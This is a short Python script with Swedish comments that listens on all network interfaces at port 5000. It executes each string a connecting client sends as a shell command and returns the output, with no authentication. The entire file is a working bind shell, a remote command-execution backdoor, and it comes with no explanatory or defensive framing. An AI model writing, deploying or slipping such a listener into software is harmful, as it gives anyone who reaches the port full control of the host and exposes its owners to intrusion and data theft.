import socket
import subprocess

# Konfigurera IP och port
HOST = '0.0.0.0'  # Lyssnar på alla nätverkskort
PORT = 5000       # Porten klienten lyssnar på

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    print(f"[INFO] Lyssnar på {HOST}:{PORT}...")
    
    conn, addr = s.accept()
    with conn:
        print(f"[INFO] Ansluten av {addr}")
        while True:
            data = conn.recv(1024)
            if not data:
                break
            command = data.decode()
            if command.lower() == 'exit':
                print("[INFO] Avslutar...")
                break
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as e:
                output = e.output
            conn.sendall(output)
